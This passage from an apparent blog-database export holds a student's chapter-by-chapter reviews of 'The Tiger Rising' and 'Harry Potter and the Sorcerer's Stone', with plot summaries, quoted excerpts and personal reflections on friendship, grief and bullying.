eyes open and took each hit without blinking.\n\nAnd Rob saw that hitting was going to be enough.\n\nExplanation\n\nThis dialogue is about Rob when he knew his father shoot the tiger. \"As powerful as the tiger, beat him with his fists,\" showed how angry Rob was his father shooting and killing the tiger. It is a dialogue I can never forget, it is really emotional-affecting. Rob took the anger from the suitcase to hit his father, and he was really mad and angry of it.\n\n### Part Three My Idea\n\nThe last six chapters that ended the book really affect me. They are the best chapters in the whole and are full of emotions.\n\nChapter 25 is about Rob deciding to free the tiger. Comparing to Sistine, Willie May is more wiser and thought deeper. However, she wasn't so kind and pure like Rob and Sistine, she experienced more and became more like the common adult.\n\nAnother point there is to say is that how Sistine acted to her almost closest friend Rob when he said that her daddy ain't coming. We can see that Sistine lost her judgement and became doubtful in life after the angers. When sometimes somebody was so angry, they last everything and became just like animals, unable to see what is right and what is wrong. \"Dark, Cold, Glare\" and many other adjectives decribes it.\n\nChapter 26 is mainly a dialogue with Beauchamp. It showed that Sistine didn't mean to not talk to Rob the rest if her life and Rob's decision to free the tiger.\n\nChanpter 27 and 28 aren't like any chapters in this book. They are strong. Rob's action showed how he hate his life, the death of his mother and everything that happened here. These things tortured Rob and he became depressed. He want to revenge. The sadness managed to pull it out, to open his suitcase, and let the tiger rise.\n\nThe crack of a gun killed Rob's tiger. It was a really sad moment. He was not whole that time because he had lost his tiger and everything. His revenge to his father was all his anger he had in the half year after his mother death.\n\nHowever, the name of caroline brought him back to life. He finally understand his father. He had to kill the tiger because it may cause serious damage and no one could tell how it will behave.\n\nRob said \"my tiger\" because the tiger is just like himself. He has just so much in common with it. That's why he said the tiger was his.\n\nThe burying of the tiger brought Rob back to himself. Tears came back to him and he finally became open-minded. The lighter inside showed how sad Rob was when his mother died.\n\nAt last, the ending of this book. It seemed to us too sudden, but it is exactly the point where the book should end. I don't think this book is happy, even the ending. What may happen next? It left us with imaginations. I think that Rob will start to be happy again. It is true that Rob's father will lose his job, Beauchamp will be mad and even fine him, the bullies in school will bully him again. But Rob won't care about this and will face them bravely with Sistine.\n\nThe last chapter successfully put a period to Rob and his stories. I may not understand the deep meanings in this book, but I told what I get and learned from this book. It is one of the books that express so many emotions. Though the book is short, it is the best fiction dealing about feelings, more than any 121-page-book can contain\n\n\u200b\n\n## Conclusion\n\nThe Tiger Rising is written by Kate Dicamillo, an author of many great novels. Though it is very short, it is full of emotions and really affecting.\n\nThe book is mainly about friendship. Different from other books, it took place many years ago. I was wondering about how Rob and Sistine discovered friendship in such a time, especilly when they first hated each other so much. After thinking , I learned friends are people who help each other, not only standing up to bullies and defend the other, but also to help mentally, like cheering somebody up after when he is down, understanding feelings or achieving a goal together. That's what friends are for.\n\nWhen it comes to understanding, Rob and Sistine have much of this in their friendship. One's parents divorced, one's mother died, they really have much in common. By talking about the Sistine Chapel, Sistine knew that Rob wasn't a boy of nothing.\n\nBy helping out with the bullies, Rob and Sistine started a frienship. By understanding each other, they became good friends, Finally, by achieving a goal, which is to free the tiger, they became inseparable. However, the tiger was cruelly shot by Rob's father. This time, it came again to understanding and the friendship became unbreakable.\n\nNow let's go back to describing Rob. As the main character, he is pessimistic, intraoverted, and artistic. With his mother died and his father depressed, he was uncontrollably droven to became an introverted person who keeps everything to himself. He didn't want to get too much pain and closed his suitcase, or his mind and got more pain than he thought. After becoming introverted, moving to a new place and getting bullied, he started to be pessimistic, a person who thinks everything is bad. He went to school with thoughts just to bear one more day and started to dislike school. That was a time when living didn't mean everything, when life everyday is like living in hell, when Rob gave up the thought of expressing his feelings. That is more pain than facing the truth in life. If it wasn't for Sistine, he may be introverted forever and never be a man.\n\nHowever, he is very artistic. He carved a wooden bird and a \"Sistine\" which looks real.\n\nThe most annoying character is Beauchmp. Though rich, he didn't have anything inside but is a coward, as Rob's father said, He underpaid Rob's father and liked driving cars crazily. He was afraid of the tiger because he did wrong things. He caged wild animals. That's why he gave Rob money to let him feed it. He is nothing but a big fool.\n\nIf I am the author, I may end the book with Rob starting to adapt to school life by fighting back the bullies and enjoy going to school with Sistine. instead of ending the book abruptly after the adventure ended. I feel not so joyful in my heart when book ended but the story is not yet finished, or doesn't have a \"happily ever after\" kind of ending.\n\nHowever, it left us various imaginations and ended at the exact point where some things are yet not decided, It is the best way to end a novel.\n\nAfter all, this is the most emotional-affecting and memorable novel and I will never forget it. It will always be with me when I faced problems in my future life."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8ded9"}, "title": "The Tiger Rising Book Review(Part 1)", "date": {"$date": "2018-07-15T10:02:00Z"}, "type": "literature", "access": 1, "body": "## Chapter 1-6\n\n### A Short Explanation to Why I Chose This Book\n\nAs Harry completed his first year at Hogwarts, a new story took place in Florida, in the woods behind the hotel Kentucky Star. Though there were no spells or curses in this book, it was just as touching as any other adventures I\u2019ve witnessed.\n\nI found that book first on a shelf in a bookstore when I went to America along with five other Dicamillo's books. I couldn't urge to read it once I saw the picture in front of the book and I couldn't help but writing a book review. There are so much things inside this one-hundred-and-twenty-page book. Kate Dicamillo surprised us with another miraculous tale.\n\nAnd now let's begin.\n\n### Part One A Brief Summary\n\nThe first three chapters told us about a motherless child Rob Horton who was always bullied at school. He discovered a tiger was in the woods on a normal day to school.\n\nHe had read about Sistine Chapel in a book and found a girl who wore party dress named Sistine in school.\n\nThe next three chapters in the book is mainly about Sistine Bailey introducing herself and getting laughed, Rob accused and having to stay home because of his \u201ccontagious\u201d leg disease, and Rob helping Sistine getting out of an occasion.\n\n### Part Two Impressive Plots\n\n1 A Surprising Plot\n\nThis was such a surprising development, to have the bus stop halfway through its route, that Norton stopped grinding his knuckles into Rob's scalp and Billy stopped punching Rob in the arm.\n\n\"Hey, Mr.Nelson,\" Norton shouted. \"Whatcha doin\u2019\uff1f\"\n\n\u201cThis ain't a stop, Mr, Nelson,\u201d Billy called out helpfully.\n\nBut Mr.Nelson ignored them . He keep whistling his non song as he swung open the bus door. And while Norton and Billy and Rob watched, open-mouthed and silent, a girl with yellow hair and a pink lacy dress walked up the steps and onto the bus.\n\n2 A Fearful Plot\n\nThey wereall looking at him. Waiting. Sistine was waiting, too; waiting for him to do something. He looked down at the ground and saw what they have thrown to her. It was an apple. He stared at it for what seemed like a long time, and when he looked back up, they were still waiting to see what he would do.\n\nAnd so he ran. And after a minute, he could tell that they were running after him, he didn't need to look back to see if they were there. He knew it. He knew the feeling of being chased. He dropped the picture of the tiger and ran fall out, pumping his legs and arms hard. They were still behind him.\n\n### Part Three My Idea\n\nThe first chapter briefly introduced Rob Horton, a boy of our age,to us. His life were just like us and, as we can learn from the story, wasn't so bad until his mother died.\n\nWe can see the cruelty of sickness and its affect to Rob. We always yell and cry when something bad happens, but Rob chose to ignore it. When we cry, the bad things and sadness pour out and didn't sound as bad after we were done. That way, we gave vent to our sadness. But Rob didn't cry. He didn't feel as much depression ashe cry when he tried to ignore things, to ignore life.\n\nHowever,when he tried to get rid of sadness, he couldn't. He has sadness deep in theheart haunting and he couldn't be happy and laugh like we do. Pouring something out is way better than keep everything inside.\n\nI must inspect the characteristic of Billy and Norman Threemonger. Comparing with bullies in other books, we can see that Augustus Gloop, Verua Salt and Dudley Dursley are far better. They are just greedy and demand everything while Billy and Norman are evil. They bullied people just because they were stronger and that God didn't pick on their mothers. I almost wanted to jump in that school busand put the cruciatus curse, one of the curse which tortures people in Harry Potter, on them. They will just be people who do hard works and earn nothing when they grow up.\n\nThe surprised scene of students staring showed that how uncommon Sistine was. Everything in this book, in chapter one and two, suggested that it was another gloomy day to start, another gloomy day for Rob to finish, another meaningless day.\n\nHowever,with the tiger and Sistine, it wasn't a day which you can ignore just like that. It was a day that is worth remembering. It changed Rob's life the second time and helped him found a bit of his usual form, the boy who was loved by his mother.\n\nWe could see that Sistine came in spotlights. Everybody was shocked. It also showed how rude it is to interrupt one's introduction, and more by using an idiom for the teacher.\n\nWhy did Sistine hate Rob so much? Because of Rob's powerless and incapable of doingthings. That's why she sat next to him on the school bus on the way home. Rob showed his bravery and sympathy that day.\n\nAs Rob went into the principle's office, we can tell that the principle isn't sure about the contagious thing himself by coughing his throat. He only wanted to respond to the worried parents that he did something. In fact, he remained unsure all the time and he is even more powerless, comparing to Rob, though he is the principle.\n\nChapter 6 is important. It compared Sistine and Rob's way of handling bullies. These boys and girls will never leave you alone. You should first chose to igore, but when they push it to a point. You can never deal with them regularly. You must fight them to show you\u2019re not a fool. The other way is trying to be friend them. You can be unharmed by others by doing it.\n\nIt is quite a difference between handling situations. Comparingly, I appreciate fighting. Life is meaningless when you choose to ignore everything. You can only let it fly when you are doing something. As I said, we must pour out things rather than let everything inside. That way, we have our sadness erupted.\n\nIt told us about people that time, the whistling driver, the strange way they speak. It was many years before, but the story isn't dull like the gloomy life that time. Rob and the tiger shared something in common. They were both locked up in different ways. They helped each other out. And as the sadness in Rob's heart rised, little by little, the story continues, surprising us with each chapters better and more touching than the one before.\n\n## Chapter 7-12\n\n### Part One A Brief Summary\n\nSistine sat with Rob on the bus back to home, and Rob showed Sistine what the Sistine Chapel is. Rob returned back to the hotel. Unable to go to school because of his \"contagious\" disease, he stayed at home as a working man for a few days and at the same time trying to see if the tiger was still there.\n\nRob Horton and Sistine started a friendship by saving each other from bullies andnow, as their friendship continues, they found some things and topics in common and decided to explore the tiger together.\n\n### Part Two Impressive Plots\n\n1 A Sad Plot\n\nHe stayed up late working on the caring, and when he finally fell asleep, he dreamed about the tiger, only it wasn't in a cage. It was free and running through the woods, and there was something on its back, but Rob couldn't tell what it was.As the tiger got closer and closer, Rob saw that the thing was Sistine in her pink party dress. She was riding the tiger. In his dream, Rob waved to her andshe waved back at him. But she didn't stop. She and the tiger kept going, past Rob, deeper and deeper into the woods.\n\n2 A Predicted-but-surprising Plot\n\nHe took a breath. He opened his mouth and let the words fall out. \"I know where there's a tiger.\"\n\nSistine stood in the drizzly rain and stared at him, her eyes black and fierce.\n\nShe didn't say \"A real one? \"\n\nShe didn't say \"Are you crazy? \"\n\nShe didn't say \"You're a big old liar.\"\n\nShe said one word: \"Where? \"\n\nAnd Rob knew then that he had picked the right person to tell.\n\nExplaination:\n\nThe plot above is both predicted and surprising. It is surprising because almost nobody can believe that there's a tiger. Imagine your best friend saying there's atiger (not in a zoo, but in a cage in the woods), you will probably respond the usual sentence \u201cAre you crazy?\u201d or something like that, but Sistine didn't and asked where. It was like a joke but she took it seriously, because she thought Rob is a friend. That's why it's surprising, though the fact that Rob had actually found a tiger in chapter one made it a little less surprising.\n\nIt is also predicted because that Rob\u2019s actions made Sistine believe him to be a true friend who is trustworthy, not a fake friend. And knowing that Rob wasn't a joyful boy, just like Harry didn\u2019t think that Hagrid's a joke played by the Dursleys, she believed him. Though their friendship hasn't even really started, they knew each other a lot.\n\n### Part Three My Idea\n\nChapter 7 is about the conversation on the school bus. Why can this day be called extraordinary? Because it was different from the other gloomy days Rob had when time just slipped by and got nothing. On that day, Rob found the tiger and discovered a friend. These discoveries made the ordinary day extraordinary.\n\nWe can identify that Rob has some same points with Sistine. For one thing, they both dread going to school, the bullies, the stupid teachers and other things. However, Rob didn't want to express his feelings to anybody, all except maybe his father because his father has been with him together. That was why he was glad that Norton an Billy beat him to silence.\n\nFriendship is made up by sharing the same feelings with somebody. The friendship between Rob and Sistine started because of it.\n\nChapter 8 shows us how much Rob's father loved him, he loved Rob as much as Rob\u2019s mother. He just didn\u2019t show it in Rob\u2019s mother\u2019s way and became fierce and hard after the death of his wife Caroline. Working just for Beauchamp everyday just to earn a living. He, like Rob, hide his feelings inside. We can also define how good Rob's mother and father had combined together, the strong and the gentle. I heard that people with opposite characteristics are more likely to be better when they are together. Rob chose moving and living in a motel instead staying in his hometown, where everybody and everything reminded him of his loving, caring mother. It was so overwhelming. Maybe they'll even get some money from their neighbors. But his father chose to leave it, to live themselves instead of depending on others. Rob started hating the sun, I noted in the book. He was even glad if the whole state was flooded, everybody would be like him, a boy who was helpless and everything would disappear.\n\nAnother thing to notice is that Rob carved Sistine instead of someone else, like his mother said, you do what wanted and you followed. Why would Rob carve Sistine? Because she is who he needed. Just like Rob's mother, Sistine brought a piece of sunlight to Rob's life. When life's down, especially for a long time, something big will always happen to cheer you up from being depressed. From Sistine's act, Rob knew that she is another outsider of the society, unlike those gray building and dullness. She is just like his mother, active and open.\n\nChapter 10 showed us Willie May's ideas and also how Beauchamp badly treated his workers. He didn't give them much salary while he himself owned a tiger. It didn't seem fair. That's the gap of poor and rich years ago, but so many years passed that almost nobody remember it now. However, the author described it brilliantly.\n\nWillie May\u2019s words are important. It is why this book is called The Tiger Rising. It showed darkness and sadness must be faced rather than kept in the heart.\n\nThe injury in Rob's leg helped us to understand the novel. There are no such disease like that while you must face sadness to cure it. Or maybe it's just Willie May's imagination. But it symbolized memories, soreness, and despair. If we don't face it and defeat it. It would forever remain, just like the tiger in the cage.\n\nChapter 12 and 13 is a conversation. The rudeness of Norton and Billy Threemonger are again shown here. I think Rob was right, they should be eated. They are worse than animals.\n\nThe conversation is short but touching. Seeing the tiger seem perfect for an adventure as they decided to go there. It ended so sudden and let me thinking about what they will say to each other and how they will find the tiger. Let's find out in the next eighteen chapters.\n\n\u200b\n\n## Chapter 13-18\n\n### Part One A Brief Summary\n\nRob and Sistine finally explored the woods by themselves and found the tiger's still there. On the way they shared a few secrets about their families. Then Sistine went to the laundry room to phone her mother.\n\nRob andout the Sistine had a short conversation after they found the tiger and Sistine went away with her mother. Willie May told Rob about her bird Cricket and how she let him go. Beauchamp drove Rob into the woods to gave him a job of feeding the tiger with the meat.\n\n### Part Two Impressive Plots\n\n1 A Happy Plot\n\nSistine said, \"Stop shrugging your shoulders at me. I hat it, I hate the way you shrug all the time.\"\n\nAnd that made Rob remember Willie May saying that when he shrugged he looked like a skinny bird trying to fly. It struck him as funny now. He laughed out loud at the thought of it. And without asking him what he was laughing about, without dropping his hand, without stopping, Sistine laughed too.\n\nThen Rob remembered the name of the feeling that was pushing inside him, filling him fall to overflowing. It was happiness. That was what it was called.\n\nBy the time they made it back to the motel parking lot, it was dark outside, and they were both laughing so hard that they could barely walk.\n\nExplanation\n\nI chose this one as the plot I loved because it showed a sharp contrast to what Rob was at the beginning of the book. It is happy happy because I think there are no better way to define it, Some words that are long and few people know it are always complex. This plot is simple, just happiness being discovered.\n\nIt is like a normal daily joke for us, but there weren't many before. And after seeing the tiger again, Rob finally discovered something in his heart. It showed how melancholy Rob and Sistine was. When one is so depressed, once he or she laughed, he or she cannot stop laughing because they lacks it. And that's the case for Rob and Sistine. When his happiness began to flow, just like the way we laugh when we just finished crying, but much deeper. Though life isn't good, though many things black in front of him, Ron finally learn to enjoy the moment a little and had the little bits of happiness back in his heart.\n\n2 A Heart-breaking Plot\n\nRob took hold of the sheet, and as it billowed out between them, a memory rose up before him: his father standing out in the yard, holding his gun up to the sky, taking aim at a bird.\n\n\"You think I can hit it? \" his father said. \"You think I can hit that itty-bitty bird? \"\n\n\"Robert,\" his mother said, \"what do you want to shoot that bird for?\"\n\n\"To prove I can,\" said his father.\n\nThere was a single crack and the bird was suspended in midair, pinned for a moment to the sky with his father's bullet. Then it fell.\n\n\"Oh, Robert,\" his mother said.\n\nIt hurt the back of Rob's throat to think about that now, to think about the gun and his mother and the small thud the bird made when it hit the ground.\n\nExplanation:\n\nReading the sentences above made me sad. It is really a cruel act of Rob's father, by shooting the bird, a thing so harmless and attractive. I always wondered why Rob's father shooted it. And the answer is clear: it isn't because he was really bad or something like that, it is because that Rob's father wanted to prove he isn't an idiot, a man who can't do anything. The author described it really well and\n\nheart-breaking: \"still-warm,\" \"pined,\" and \"It is like seeing a life actually despairing.\" It shows us that Rob's father wasn't really happy, the memories are better than what's in reality, and also that how people were years ago and gave us an impression that Willie Mary's bird got into bad accidents.\n\n### Part Three My Idea\n\nAfter three weeks of writing just some normal parts, I came to the climax of the story at last. Though somebody may think the first twelve chapters are long, and it's boring to read them, I don't. I think if it's not the first twelve chapters, one can never understand the background of Rob easily and may think the story is confused and hard to understand.\n\nAnd finally, they found the tigers. It used \"enormous and bright\", and \"pacing back and fourth\" to describe it. Reading this part, I saw a tiger pacing right in front of me. I was not reading, not in my house, not sitting here for hours, but following Rob and Sistine down the woods to see the tiger in Florida, expecting all sorts of exciting things to happen.\n\nThe first reaction Rob made was staring and fearing just like seeing some ancient writings or priceless treasures. It surely is, considering the time of the story. In that time bullying is common and seeing tigers out there or other things are rare.\n\nBut Sistine wanted to free it, to let it go, jumping up and down and to let it out. She cannot let something move their own way, she didn't adjust to the normal life there.\n\nAfter a really long time thinking about the reactions, I think the tiger represent Rob's happiness in his heart. It wanted to come out, but couldn't as sadness and depression filled in Rob's head.\n\nAnd then Rob seemed to know it better to keep it outside than letting it inside, and he let the things in the suitcase out a little. That's the time when he started laughing. We don't laugh that hard hearing a joke. It showed how Rob was, so helpless a child. Remembering and the nonstopping laugh showed Rob was in depression for very long before, that he hated it but still let it rule over happiness, just to keep things inside. But in fact, he suffered more.\n\nChapter 15 started by telling us how Rob's father and Sistine known each other. Then it had a sharp move by telling us memories of Rob, his mother, how they used to live happily together. I don't blame him, though, for closing the suitcase. It is so overwhelming.\n\nAs I said before, Rob only let the suitcase open a little, but found it dark and painful. But this darkness can not be hidden forever, not in front of Sistine and hiding so long. The next fifteen chapters told us how he got rid of them.\n\nAlthough the tiger part in the book is the most exciting part, other parts can't be ignored.\n\nChapter 13 is mainly about telling their secrets. We can see similarities in Rob and Sistine's family, on their mother, One dead, one divorced, they shared the same dark secrets. Rob couldn't bear Sistine leaving because in the dream she left, leaving unhappiness and depression on the lonely Rob. That's why he told Sistine the secret of his family.\n\nI think I discovered a same part about Sistine and Caroline. They were both bright and symbolize happiness and not keeping things inside.\n\nChapter sixteen is about a talk, simple actually, but touching and unforgettable. It shown how Sistine was when her parents were in love. They face the same fate except that Rob's deeper. On Page 61, we can see the other side of this active girl when she growled and shouted. The family issue is really bad and, even in some points, worser than Rob's.\n\nI think this is the time when Rob finally discovered somebody he had shared the same background with. What I paid attention to was also the last paragraph----this is the exact point where, the suitcase was secondly opened. Inside it, were sweet memories, tigers, and other beautiful things, but Rob didn't want to face it because her mother died, and he thought all things disappeared. He discovered a similarity and opened a little in the end of chapter 16.\n\nChapter 17 is little different. It gave me the impression that Willie May was kind-hearted and Rob's father was cruel. It, as I said before, was the common society that time.\n\nAnother small point, Rob thought Willie May's hand could hold the entire world. It is really exagerrated but is vivid. It is a hand that hold Cricket, that was kind, and experienced many years of hardness.\n\nChapter 18 is about Beauchamp wanting Rob to do a job. The rudeness in Beanchamp's voice showed how rich people were that time. they were more than bullies, they get all money while poor people got almost nothing. Also that Rob said he believed it in the last sencence. What did he believe? I think he believed that there's the tiger. He believed he can free it and Beauchamp is the real fool.\n\nThis three chapters really did tell us a real lot things. I don't know why I have so much to express. Maybe because that the plot is more profound. This book really touched my heart and I liked it best in emotional books I've read. Let's see how Rob and Sistine freed the tiger next time.\n\n\u200b"}, {"_id": {"$oid": "66ebe945f24e7c3e85e8deda"}, "title": "How to Build a Personal Website", "date": {"$date": "2023-03-31T00:00:00Z"}, "type": "web-dev", "access": 1, "body": "Suppose you want to set up a blog online, or write a curriculum vitae, or whatever, how to build a good personal website?\n\n## Wechat Blog\n\nBlogging in WeChat has been fun for the last 5 years.

Caught by surprise, Harry fell hard on the concrete floor. What came next happened so fast no one saw how it happened -- one second, Piers and Dudley were leaning right up close to the glass, the next, they had leapt back with howls of horror. Harry sat up and gasped; the glass front of the boa constrictor's tank had vanished. The great snake was uncoiling itself rapidly, slithering out onto the floor. People throughout the reptile house screamed and started running for the exits.\n\n![alt text](https://cdn.jimchen.me/b4ebd9d9-dbfc-4b9c-a830-70955ea4c319_image-2.png)\n\n### Part Three My Idea\n\nThe first chapter sounds dull but can't be ignored. It's effects are all over the book and especially the next two chapters. The first two pages tell us about the Durslys and readers know that they must hate Harry before they read the next chapter.\n\nThe second chapter describes elements of traditional British stories without telling about the under pinnings of the plot. Dudly is a bully, greedy boy who wants everything and was spoiled by his parents.\n\nThe third chapter is about letters that was sent by Mcgonagall. It describes how uncle Vernon threw Harry out to stop him looking at letters. But magic can't be stopped.\n\nThese three chapters are based on 'the greatest fear' and \"involved in nothing mysterious\" in chapter one, which are features of the Dursleys. It is why they will treat Harry harshly.\n\nIt also showed the stark contrast between muggles and wizards.\n\nThe words are charming and it makes this book extraordinary. Once I read the first chapter I can't put the book down. It is a really extraordinary novel.\n\n## Chapter 4-6\n\n### Part One A Brief Summary\n\nThe door was broken open by the gamekeeper, Hagrid.

On the Hogwarts Express, Harry became friends with Ron and Hermione. Then they arrived at Hogwarts.\n\n### Part Two A Funny Plot\n\n\"I AM NOT PAYING FOR SOME CRACKPOT OLD FOOL To TEACH HIM MAGICTRICKS!\" yelled Uncle Vernon.\n\nBut he had finally gone too far. Hagrid seized his umbrella andwhirled it over his head, \"NEVER,\" he thundered, \"- INSULT-ALBUS- DUMBLEDOREIN- FRONT- OF- ME!\"\n\nHe brought the umbrella swishing down through the air to point at Dudley -- there was a flash of violet light, a sound like a firecracker, asharp squeal, and the next second, Dudley was dancing on the spot with hishands clasped over his fat bottom, howling in pain. When he turned his back onthem, Harry saw a curly pig's tail poking through a hole in his trousers.\n\n![alt text](https://cdn.jimchen.me/f4c92772-ac8d-47e6-b6c3-f86430484b01_image-3.png)\n![alt text](https://cdn.jimchen.me/106f3a67-d609-45f7-865d-8c78e8e9724a_image-4.png)\n\n### Part Three My Idea\n\nThe fourth chapter is funny to read because the Dursleys finally got paid for what they're done. And if it's not the courage of Uncle Vernon that enabled him to stand up to Hagrid, the chapter might not be exciting.\n\nThe fifth chapter is also vivid. These two chapters describes us another world, when there's wizards and withches and muggles. Though it isn't as exciting, it's explanation about magic are unignorable. And people shaking hands with Harry and Hagrids shuddering about \"Voldemort\" gives readers a more accurate understanding about Voldemort.\n\nThe sixth chapter is about Harry meeting the Weasleys, people different from the Dursleys, on the Hogwarts Express. It described how dull the muggle world, in other words, our world is by contrasting the two worlds and people in it.\n\nHowever, going to Hogwarts isn't just fun, and hogwarts isn't a paradise. We can still find many bad people like Malfoy, Snape, and Voldemort in later chapters in the wizarding world. Going to Hogwarts wasn't an ending for Harry, but a beginning.\n\nOne day I hope I can go to Hogwarts. But I doubt it will happen because I can't do anything by pointing my wand at something and shouting curses. Plus I am twelve and hasn't received any letter.\n\nHowever, I stll can enjoy my life even without doing magic. The song Something Just Like This tells us about it . \"Some Superhero, Some Fairytale bliss\" \"Where'd you wonna go? How much you wanna risk? \" These sentences cheered me up from not being able to do magic or be a wizard.\n\n![alt text](https://cdn.jimchen.me/8dd9544a-a391-4431-a5f0-ab8bbe0f6a57_image-5.png)\n\n## Chapter 7-10\n\n### Part One A Brief Summary\n\nHarry's first week at Hogwarts had been good, except for Snape's class, Snape loathed him at first sight. And as a gryffindor student, Harry became enemies with Draco Malfoy when he stole Neville's ball, which Harry managed to get back and was selected a Qudditch seeker. Malfoy and Harry decided to have a wizard duel. Harry and his friends was nearly caught when he set out to duel with Malfoy, which that Harry realized is a trick. They then faced a three-headed dog Nicholas Flamel but got back to their dorm safely.\n\n### Part Two A Scary Plot\n\nThey were looking straight into the eyes of a monstrous dog, a dog that filled the whole space between ceiling and floor. It had three heads. Three pairs of rolling, mad eyes; three noses, twitching and quivering in their direction; three drooling mouths, saliva hanging in slippery ropes from yellowish fangs.\n\nIt was standing quite still, all six eyes staring at them, and Harry knew that the only reason they weren't already dead was that their sudden appearance hadtaken it by surprise, but it was quickly getting over that, there was nomistaking what those thunderous growls meant.\n\n\n![alt text](https://cdn.jimchen.me/b4a344a5-9a5d-4452-9106-6d1470a6ccc2_image-6.png)\n\n### Part Three My Idea\n\nChapter seven is mainly about the sorting hat, It describes the thoughts of Harry vividly by the words ''What if he just sat there with the hat over hiseyes for ages, until Professor McGonagall jerked it off his head and said therehad obviously been a mistake and he'd better get back on the train?\" It showed how nervous Harry was, together with the time when Harry thought Hagrid and Hogwarts was just a dream.\n\nIt is almost the first time Harry received such kindness. He was nervous because he wasn't like his classmates. He couldn't do any magic and thought himself is just a boy of 11. It showed us how badly the Dursleys' are.\n\nThere are different houses in Hogwarts and Gryffindor and Slytherin has the most conflicts. Slytherin's, as we I found out, has a discrimination on muggle-borns. However, it is revealed that muggle-borns, like Hermione Granger, may do better than most of the pure-bloods.\n\nThe ninth chapter is the most interesting one that I will describe it the longest. I always wondered that because Professor Mcgonagall is so strict, why didn't she punish or expell Harry? Because that Harry dared to stand up to Malfoy and his actions were noble. We feel that Harry most certainly not bad, or even don't see a single bad feature in him. But why did he break rules twice in the first two weeles to get himself expelled from a such interesting and fascinating place? It is because that he has the curiousity as a child of new, extraordinary things and places. What makes the story excellent is that characteristics various. A boy cannot be unnaughty, or he wouldn't be anything in the future.\n\nThe dog part plays an important role because that it shows us Hogwarts isn't just good, it also contains some dangerous things.\n\nOverall, these chapters are really fun and good to read. It not only describes the exciting fights and near death moments, but also gives us a clear view of people's personality and the variety of the world.\n\n![alt text](https://cdn.jimchen.me/6228b028-b48f-4c60-be16-564231405cc6_image-7.png)\n\n## Chapter 10-13\n\n### Part One A Brief Summary\n\nThough Ron complained about Hermione being a nerd, Harry, Ron, and Hermione discovered a friendship by helping each other fighting off a troll.\n\nHarry was stuck in midair when playing qudditch and Hermione set Snape on fire, who was murmuring curses nonstop at Harry. Then Harry won the game.\n\nHarry received an invisibility cloak on christmas and found his parents in the Mirror of the Erised. Then Dumbledore found Harry and forgave him for wandering at night.\n\n### Part Two A Surprising Plot\n\nSuddenly, people were pointing up at Harry all over the stands. His broom had started to roll over and over, with him only just managing to hold on. Then the whole crowd gasped. Harry's broom had given a wild jerk and Harry swung off it. He was now dangling from it, holding on with only one hand.\n\n![alt text](https://cdn.jimchen.me/5894169f-747c-4bb1-b38d-8b9c90e2e143_image-10.png)\n![alt text](https://cdn.jimchen.me/a65de3b2-ab35-4e16-a4d7-5785914d9dd9_image-11.png)\n\n\n### Part Three My idea\n\nChapter ten is mainly about Harry and Ron's relationship with Herminoe supported by Qudditch and the troll. Ron complained about Hermione because that she was proud, and the reason of that, as I found out later, is because Hermione is a muggle-born. She is weak in the heart so she likes showing off and obey rules.\n\nWe can reveal from the book that even Hogwarts teachers, advanced in magic, were scared even to a monster, let alone the Death Eaters and the Voldemort himself. That shows the courage of Harry and Ron. about saving a friend. And in return, Hermione told Mcgonagal the lie. It tells us that people are more likely to become friends when they are good to each other or both facing bad things at the same time. Hremione finally gave up perfectionism and valued frienship more.\n\nAgain, this chapter show how little Harry know about the magic world and how timid he was when spending years with the Dursleys. It is a stark contrast between the behavior of him and Malfoy, a student who is proud and like Dudley. Malfoy is also damaged by his family.\n\nThe next chapter shows Hogwarts is not a good place where everyone study hard and have fun. The Qudditch became a game more of fighting than enjoying. There are two sides in Hogwarts, one is Dumbledore and Harry, the other is Malfoy and Snape. It showed a place can never be without fights and complex people.\n\nThen again, it told us how important friendship is. Hermione saved Harry from falling by setting fire on Snape. This makes the story's climax start. The slip of Nicolas Flamel Makes the story even more exciting.\n\nHowever, when Harry received and invisibility cloak and almost went mad with the Mirror of the Erised, Dumbledore's appearance changed the direction of the plot. He convinced Harry not to look at it. That's why others like Qurriel, went following Voldemost. The discussion also played a big part. It shows Dumbledore is not only one of the best sorcerer in the world but also kind.\n\n## Chapter 13-15\n\n### Part One A Brief Summary\n\nFollowing Dumblesore's advice, Harry didn't visit the mirror anymore. Gryffindor wins Qudditch, meaning it'll be first in the championship.\n\nHowever, Harry's day was ruined when Filch caught him wandering in corridors and Harry was sent to a detention. Filch decreased 50 points of Gryffindor as well.\n\nHarry noticed something----Fluffy guarding a stone, Snape and Qurriel's argument, and somebody drinking unicorn bloods in the woods.\n\n### Part Two A Not-So-Happy Plot\n\nThey slipped back down the spiral staircase, their hearts as light as their hands, now that Norbert was off them. No more dragon -- Malfoy in detention -- what could spoil their happiness?\n\nThe answer to that was waiting at the foot of the stairs. As they stepped into the corridor, Filch's face loomed suddenly out of the darkness.\n\n\"Well, well,well,\" he whispered, \"we are in trouble.\"\n\nThey'd left theinvisibility cloak on top of the tower.\n\n![alt text](https://cdn.jimchen.me/99fc4604-a3be-4e16-83dd-431d869b7957_image-12.png)\n![alt text](https://cdn.jimchen.me/64798987-487d-4dfe-9219-af5904594784_image-13.png)\n\n### Part Three My Idea\n\nChapter 14 is mainly about the sorcerer's stone. It described the quarrel of Snape and Qurriel. It revealed that something was about to happen.\n\nWe can see Hagrid in many chapters in the story. Hagrid is an interesting person. He is a fishy but kind. He believes animals are good creatures. Even if they do bad things to him. He even tried to raise a dragon, which results in getting Harry in trouble instead. Harry and Hagrid meets in some points, their kindness and generosity. But they are also different. Harry dare to stand up to bad guys but Hagrid just beared it. In his fifty years mixture both good and bad things, he learned things but just let them pass without revenging.\n\nEven if Gryffindor isn't just good, you can't explain why Harry just keep breaking rules. It's the boy's curiousity, but also his lack awareness of rules. Though, Harry did learn something from the detertion. and the one hundered fifty points in the next Chapter.\n\nIn chapter eighteen, Harry and his friends got into detentions. It showed that Hogwarts isn't just a safe place. It is full of dangers, Nicolas Flamel and a figure drinking unicorn bloods.\n\nAfter all, it's Voldemort's cruelty makes people fear him. It is shown of him, as a dark figure, drinking a beautiful unicorn's blood. It is also shown in later books. Everyone is afraid to end up like the victims do. That's why even after eleven years, people are still afraid of Voldemort and just couldn't bear to say his name.\n\nIt mainly supported the 2 chapters after them. These three chapters and the two chapters before gave clues to readers to let them think about what's going to happen next. When I reached this point, I almost forget time and just kept reading. It's just because that its plot seemed so perfect and ordered really well. It is not only about magic and cursing and qurrels, it's also about friendship and cruelty and kindness.\n\n## Chapter 16-18\n\n### Part One A Brief Summary\n\nHarry and his friends decided to get the stone and finally managed to get through, though Ron and Hermione didn't get inside.\n\nThen Harry managed to stop Qurriel from getting the 